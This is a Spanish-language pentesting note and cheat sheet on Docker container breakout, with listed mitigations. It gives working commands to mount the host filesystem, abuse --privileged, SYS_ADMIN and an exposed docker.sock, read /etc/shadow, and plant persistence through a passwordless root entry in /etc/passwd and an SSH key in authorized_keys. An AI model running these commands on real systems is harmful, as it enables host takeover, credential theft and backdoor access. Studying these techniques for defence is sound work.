	CheatSheet abajo
---
Tags: #docker #privilegios #mnt #capabilities

---
## 📖 Definición

El **Docker Breakout** es la técnica usada para escapar de un contenedor de Docker y obtener acceso al sistema anfitrión (host).  
Se explota cuando el contenedor está mal configurado o el atacante tiene privilegios especiales dentro del mismo.

---

## 🔎 Conceptos Clave

- **Contenedor** → Entorno aislado que comparte el kernel con el host.
    
- **Escape** → Romper el aislamiento para ejecutar comandos en el host.
    
- **Causas comunes:**
    
    - Montajes inseguros (`-v /:/mnt`).
        
    - Capacidades de Linux mal configuradas (`--cap-add=SYS_ADMIN`).
        
    - Ejecución como root dentro del contenedor.
        
    - Uso de `--privileged`.
        

---

## ⚙️ Vectores de Abuso

### 1️⃣ Montaje de volúmenes inseguros

Si el contenedor monta el root del host:

`docker run -v /:/mnt -it ubuntu /bin/bash`

→ Dentro del contenedor, puedes acceder al host:

`cd /mnt/root cat /etc/shadow`

---

### 2️⃣ Escalada mediante privilegios (`--privileged`)

Si el contenedor fue creado con `--privileged`, el aislamiento es mínimo.  
Ejemplo de abuso: montar el FS del host manualmente.

`mount -t proc proc /mnt/proc chroot /mnt /bin/bash`

---

### 3️⃣ Capacidades peligrosas

Con capacidades como `SYS_ADMIN`:

`docker run -it --cap-add=SYS_ADMIN ubuntu bash`

→ Puedes montar discos del host desde el contenedor.

---

### 4️⃣ Acceso al socket de Docker

Si dentro del contenedor existe `/var/run/docker.sock`, se puede controlar Docker del host:

`docker -H unix:///var/run/docker.sock ps docker -H unix:///var/run/docker.sock run -v /:/mnt -it ubuntu bash`

→ Montas la raíz del host y logras escape.

---

## 💣 Explotación Práctica (Checklist)

1. **Verificar si hay socket de Docker expuesto**:
    
    `ls -l /var/run/docker.sock`
    
2. **Ejecutar contenedor con root y volumen montado**:
    
    `docker run -it -v /:/mnt ubuntu bash`
    
3. **Acceder al host desde el contenedor**:
    
    `cd /mnt/root cat /etc/passwd`
    
4. **Persistencia / escalada**:
    
    - Crear usuario root en `/etc/passwd`.
        
    - Añadir clave SSH en `/root/.ssh/authorized_keys`.
        

---

## 🛠️ Herramientas Útiles

- `docker ps -a` → ver contenedores.
    
- `docker inspect <id>` → revisar configuración.
    
- `find / -name docker.sock 2>/dev/null` → detectar socket expuesto.
    

---

## 📌 Mitigaciones

- No usar `--privileged` salvo que sea indispensable.
    
- Restringir capacidades de Linux.
    
- Evitar montar `/` o directorios sensibles en contenedores.
    
- Asegurar `/var/run/docker.sock` con permisos correctos.
    
- Usar **rootless Docker**.
    

---

## 🧾 Resumen

- El breakout ocurre si Docker está mal configurado.
    
- Vectores: **volúmenes**, **privilegios**, **capabilities**, **socket expuesto**.
    
- Abuso común: montar `/` en un contenedor → acceso total al host.
    
- Mitigación: buenas prácticas de configuración y mínimo privilegio.
---
# Cheatsheet

## 🔎 Detección

```bash
# Ver si estoy en un contenedor
cat /proc/1/cgroup
hostname

# Ver permisos del usuario
id
whoami

# Buscar socket de Docker
ls -l /var/run/docker.sock
find / -name docker.sock 2>/dev/null

```

---

## ⚡ Explotación

### 1️⃣ Acceso al host por volumen montado

```bash
docker run -it -v /:/mnt ubuntu bash 
cd /mnt/root 
cat /etc/shadow
```
### 2️⃣ Con socket de Docker expuesto

```bash
# Listar contenedores del host
docker -H unix:///var/run/docker.sock ps -a

# Ejecutar contenedor con acceso al host
docker -H unix:///var/run/docker.sock run -v /:/mnt -it ubuntu bash

```

### 3️⃣ Contenedor con privilegios (`--privileged`)

```bash
mount -t proc proc /mnt/proc 
chroot /mnt /bin/bash
```

### 4️⃣ Capabilities peligrosas (`SYS_ADMIN`, `SYS_PTRACE`)

`docker run -it --cap-add=SYS_ADMIN ubuntu bash`

---

## 🎯 Persistencia / Escalada

```bash
# Crear usuario root en el host
echo "hacker::0:0::/root:/bin/bash" >> /mnt/etc/passwd

# Insertar clave SSH
mkdir -p /mnt/root/.ssh
echo "MI_CLAVE_SSH" >> /mnt/root/.ssh/authorized_keys

```

---

## 🛡️ Mitigación Rápida

- ❌ No usar `--privileged` ni `--cap-add=SYS_ADMIN`.
    
- 🔒 Proteger `/var/run/docker.sock`.
    
- 🐧 Usar **rootless Docker**.
    
- 📦 Aplicar **AppArmor / SELinux** para aislar contenedores.